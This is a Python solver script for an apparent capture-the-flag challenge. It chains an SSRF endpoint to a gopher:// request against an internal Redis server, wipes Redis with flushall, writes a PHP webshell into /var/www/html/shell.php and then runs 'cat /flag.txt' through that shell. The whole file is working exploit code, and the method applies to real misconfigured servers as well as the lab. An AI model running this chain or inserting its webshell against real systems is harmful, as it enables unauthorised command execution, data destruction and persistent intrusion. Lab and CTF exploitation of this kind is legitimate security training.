#!/usr/bin/env python3
"""Gopher Hole solver — SSRF -> redis (gopher) -> webshell -> flag."""
import re
import sys
import urllib.parse
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
APP_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11024
WEB_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 11023


def fetch(url):
    u = 'http://%s:%d/fetch?url=%s' % (HOST, APP_PORT,
                                       urllib.parse.quote(url, safe=''))
    with urllib.request.urlopen(u, timeout=15) as r:
        return r.read().decode(errors='replace')


def build_gopher(redis_host='redis', redis_port=6379):
    shell = b"<?php system($_GET['cmd']); ?>"
    assert len(shell) == 30, len(shell)

    def cmd(*args):
        out = b'*%d\r\n' % len(args)
        for a in args:
            b = a if isinstance(a, bytes) else str(a).encode()
            out += b'$%d\r\n' % len(b) + b + b'\r\n'
        return out

    payload = (
        cmd('flushall') +
        cmd('set', 'shell', shell) +
        cmd('config', 'set', 'dir', '/var/www/html') +
        cmd('config', 'set', 'dbfilename', 'shell.php') +
        cmd('save')
    )
    return 'gopher://%s:%d/_%s' % (redis_host, redis_port,
                                   urllib.parse.quote(payload, safe=''))


def get_shell(cmd):
    u = 'http://%s:%d/shell.php?cmd=%s' % (HOST, WEB_PORT,
                                           urllib.parse.quote(cmd, safe=''))
    with urllib.request.urlopen(u, timeout=10) as r:
        return r.read().decode(errors='replace')


if __name__ == '__main__':
    print('[*] recon redis via SSRF...')
    try:
        recon = fetch('http://redis:6379/')
        print('    redis says: %s' % recon.strip().splitlines()[0][:60])
    except Exception as e:
        print('    (recon failed: %s)' % e)

    print('[*] writing webshell via gopher...')
    try:
        r = fetch(build_gopher())
        print('    gopher response: %r' % r[:120])
    except Exception as e:
        print('    gopher error: %s' % e)

    print('[*] triggering webshell: cat /flag.txt')
    out = get_shell('cat /flag.txt')
    m = re.search(r'CODEX26\{[^}]+\}', out)
    if m:
        print('FLAG: %s' % m.group(0))
    else:
        print('raw output:')
        print(out)
